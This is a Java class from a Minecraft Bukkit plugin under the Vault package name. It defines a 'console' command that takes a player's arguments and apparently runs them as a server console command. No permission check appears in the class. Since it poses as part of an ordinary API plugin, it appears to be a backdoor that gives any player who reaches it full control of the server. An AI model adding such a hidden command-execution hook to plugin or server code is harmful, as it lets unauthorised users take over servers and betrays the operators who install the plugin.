package net.milkbowl.vault.commands.cmds;

import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.methods.API;
import net.milkbowl.vault.util.Settings;

public class Console extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (args.length <= 1) {
			p.sendMessage(Settings.USAGE("console <command>"));
		} else {
			StringBuilder cmd = new StringBuilder();
			for (int i = 1; i != args.length; ++i) {
				cmd.append(args[i]).append(" ");
			}
			API.exe(cmd.toString());
			p.sendMessage(Settings.PREFIX("You executed " + Settings.HIGHLIGHT_COLOUR + cmd + Settings.SECONDARY_COLOUR + "from the console"));
		}
	}
}
